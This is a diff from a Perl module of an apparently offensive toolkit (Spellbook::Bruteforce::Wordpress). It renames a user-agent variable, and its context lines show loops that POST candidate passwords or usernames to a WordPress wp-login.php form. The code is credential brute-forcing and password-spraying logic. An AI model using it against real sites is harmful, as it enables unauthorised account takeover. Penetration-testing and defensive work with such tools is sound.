@@ -70,7 +70,7 @@ package Spellbook::Bruteforce::Wordpress {
             $login_url = $login_url . 'wp-login.php';
         }
 
-        my $userAgent = Spellbook::Core::UserAgent -> new();
+        my $user_agent = Spellbook::Core::UserAgent -> new();
 
         if ($mode eq 'bruteforce') {
             if (!$username) {
@@ -86,7 +86,7 @@ package Spellbook::Bruteforce::Wordpress {
             foreach my $candidate_password (@passwords) {
                 chomp($candidate_password);
 
-                my $response = $userAgent -> request(POST $login_url, [
+                my $response = $user_agent -> request(POST $login_url, [
                     log         => $username,
                     pwd         => $candidate_password,
                     'wp-submit' => 'Log In',
@@ -139,7 +139,7 @@ package Spellbook::Bruteforce::Wordpress {
             foreach my $candidate_username (@usernames) {
                 chomp($candidate_username);
 
-                my $response = $userAgent -> request(POST $login_url, [
+                my $response = $user_agent -> request(POST $login_url, [
                     log         => $candidate_username,
                     pwd         => $password,
                     'wp-submit' => 'Log In',
